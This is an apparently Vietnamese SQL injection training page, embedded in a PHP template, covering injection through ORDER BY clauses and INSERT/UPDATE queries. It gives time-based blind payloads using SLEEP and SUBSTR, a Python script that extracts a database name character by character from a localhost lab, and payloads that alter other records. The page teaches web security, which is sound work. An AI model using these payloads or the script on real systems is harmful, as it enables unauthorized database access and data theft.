<main class="main" role="main">
    <div class="content">
        <article id="post-sqli_tancong_conlai" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    [SQLI] Một Số Loại SQLi Khác
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                    <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Order-By-Clause"><a href="#Order-By-Clause" class="headerlink" title="Order By Clause"></a>Order By Clause</h1>
                <p><strong>Thực tế:</strong> Lỗi này rất hay gặp trong thực tế,bởi vì cách phòng chống SQL Injection trong PHP là Prepare Statement không thể sử dụng với trường hợp này.<br>Đa phần Coder sẽ bỏ qua phần ràng buộc này,vì nó khá dài dòng và phức tạp (Làm biếng). Họ bỏ qua thì ta khai thác.</p>
                <p>Các kỹ thuật tấn công ở trên, chỉ áp dụng khi ta được can thiệp vào câu truy vấn từ mệnh đề WHERE về sau. Nhưng có một vài các trường hợp đặc biệt, ví dụ như:</p>
                <blockquote>
                    <p>SELECT ID,TEN_SP FROM product ORDER BY {$COLUMN_NAME USER INPUT} ASC/DESC</p>
                </blockquote>
                <p>Nếu bạn nghĩ có thể truyền kiểu như:</p>
                <blockquote>
                    <p>1' ASC UNION SELECT 1,2 -- <= Muốn UNION 2 câu SELECT.</p>
                </blockquote>
                <p>Thì đó là hoàn toàn sai lầm,vì vế chúng ta can thiệp không còn là sau WHERE nữa. Nên câu truy vấn như thế không đúng.<br>Mình sẽ nêu ra ba cách để tấn công dạng này:</p>
                <ul>
                    <li>Time Based SQLi</li>
                    <li>Dùng LIKE để đoán kí tự trong database.</li>
                    <li>Dùng IF kèm với cột được sắp xếp, ví dụ nếu kết quả đúng thì sắp xếp theo cột 1, sai thì sắp xếp cột 2 =&gt; Đoán được database.</li>
                </ul>
                <p>Trong ví dụ mình sẽ làm theo cách Time Based SQLi vì đã hướng dẫn ở bài trước.<br>Hãy thử với payload:</p>
                <blockquote>
                    <p>1,(SELECT SLEEP(5)) ASC -- #</p>
                </blockquote>
                <p>Kết quả trả về sẽ chậm hơn 5 giây. Rồi áp dụng các kỹ thuật <strong>Time Based SQLi</strong> bài trước vào thôi.</p>
                <h2 id="Khai-thac"><a href="#Khai-thac" class="headerlink" title="Khai thác"></a>Khai thác</h2>
                <h3 id="Y-tuong"><a href="#Y-tuong" class="headerlink" title="Ý tưởng"></a>Ý tưởng</h3>
                <p>Như payload,ta đã thử và thành công cho máy chủ SLEEP 5 giây. Ta chỉ cần dùng thêm IF và SUBSTR để SLEEP nữa là ổn.<br>Payload có dạng:</p>
                <blockquote>
                    <p>1,(SELECT IF(SUBSTR(database(),1,1)='v', SLEEP(5),2) ) ASC -- #</p>
                </blockquote>
                <h3 id="Code-Python"><a href="#Code-Python" class="headerlink" title="Code Python"></a>Code Python</h3>
                <figure class="highlight python">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTimeResponse</span><span class="params">(URL)</span>:</span> <span class="comment">#Truyền vào 1 URL, nó sẽ tạo request tới và trả lại thời gian hoàn thành!</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    resp = requests.get(URL)</span><br><span class="line">    <span class="keyword">return</span> (time.time()-start_time)</span><br><span class="line"></span><br><span class="line">tendb = <span class="string">''</span></span><br><span class="line">URL = <span class="string">"http://localhost/final/index.php?page=sqli_tancong_other&amp;submit=ok&amp;orderby="</span></span><br><span class="line"><span class="keyword">for</span> vitri <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">		<span class="comment">#Không có nháy đơn nhé.</span></span><br><span class="line">		payload = <span class="string">"1,(SELECT IF(SUBSTR(database(),"</span>+ str(vitri) +<span class="string">",1)='"</span>+char+<span class="string">"',SLEEP(1),1)) ASC -- -"</span></span><br><span class="line">		URL_REAL = URL + payload</span><br><span class="line">		res_time = getTimeResponse(URL_REAL)</span><br><span class="line">		<span class="keyword">if</span> res_time &gt; <span class="number">1</span>:</span><br><span class="line">			tendb += char</span><br><span class="line">			<span class="keyword">print</span> tendb</span><br><span class="line">			<span class="keyword">break</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <h1 id="Insert-Update-Based-SQL-Injection"><a href="#Insert-Update-Based-SQL-Injection" class="headerlink" title="Insert/Update Based SQL Injection"></a>Insert/Update Based SQL Injection</h1>
                <p><strong>SQL Injection</strong> tất nhiên là không chỉ áp dụng được vào câu lệnh <strong>SELECT</strong> rồi.<br><strong>INSERT/UPDATE</strong> là những câu truy vấn thường xuyên được sử dụng và cũng dễ dàng dính lỗi nếu không được kiểm soát kĩ càng.</p>
                <p>Nó thuộc loại tấn công <strong>SQLi Second-order injections</strong>. Vì cần thêm chức năng khác (ví dụ như xem thông tin) để có thể thực thi được câu lệnh bị tiêm vào.</p>
                <h2 id="INSERT-QUERY"><a href="#INSERT-QUERY" class="headerlink" title="INSERT QUERY"></a>INSERT QUERY</h2>
                <p>Câu lệnh INSERT thường có cấu trúc như sau:</p>
                <blockquote>
                    <p>INSERT INTO TABLES product(ID,TEN_SP) VALUES('$ID_USER_INPUT','$TEN_USER_INPUT')</p>
                </blockquote>
                <p>Kẻ tấn công sẽ can thiệp vào để sửa lại câu lệnh tại biến $ID_USER_INPUT như sau:</p>
                <blockquote>
                    <p>100',(SELECT @@version) ) --# </p>
                </blockquote>
                <p>Thì câu truy vấn sẽ trở thành:</p>
                <blockquote>
                    <p>INSERT INTO TABLES product(ID,TEN_SP) VALUES('100',(SELECT @@version) ) -- #','$TEN_USER_INPUT')</p>
                </blockquote>
                <p>Lúc đó trong database đã thêm 1 sản phẩm với ID=100 và TEN_SP= SELECT @@version.<br>Khi thông tin sản phẩm này được lấy ra thông qua query SELECT, thì câu lệnh SELECT @@version sẽ vô tình được thực thi. Kết quả là hiển thị ra version tại nơi hiển thị tên sản phẩm.<br><strong>Lưu ý</strong>: Nếu chỉ tác động được vào biến nằm ở vị trí cuối cùng trong câu truy vấn (trong ví dụ là biến tên sản phẩm), thì không thể sử dụng cách như trên được nữa.</p>
                <h2 id="UPDATE-QUERY"><a href="#UPDATE-QUERY" class="headerlink" title="UPDATE QUERY"></a>UPDATE QUERY</h2>
                <p>Câu lệnh UPDATE thường có cấu trúc như sau:</p>
                <blockquote>
                    <p>UPDATE product SET TEN_SP='$TEN_USER_INPUT' WHERE ID = '$ID_USER_INPUT'</p>
                </blockquote>
                <p>Ta có thể lợi dụng cả 2 biến (Xem biến nào bị SQL Injection).<br>Nếu biến $TEN_USER_INPUT,ta có thể lợi dụng như sau:</p>
                <blockquote>
                    <p>(SELECT @@version) WHERE ID=1 -- #</p>
                </blockquote>
                <p>Nếu biến $ID_USER_INPUT, ta có thể lợi dụng như sau:</p>
                <blockquote>
                    <p>5' -- #</p>
                </blockquote>
                <p>=&gt; Thay đổi tên của sản phẩm người khác… (Ví dụ)</p>
                <h1 id="KET-LUAN"><a href="#KET-LUAN" class="headerlink" title="Kết Luận"></a>Kết Luận</h1>
                <p>Ở đâu có user input của người dùng được cho vào câu truy vấn SQL thì ở đó có SQL Injection.<br>Còn khá nhiều nâng cao, nhưng bài trainning chỉ dừng lại ở đây. Vì không ai có thể dạy cho bạn tất cả,còn phụ thuộc vào bản thân nữa mà, đúng không? Cùng bắt tay vào nghiên cứu thôi! </p>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>

    </div>
</main>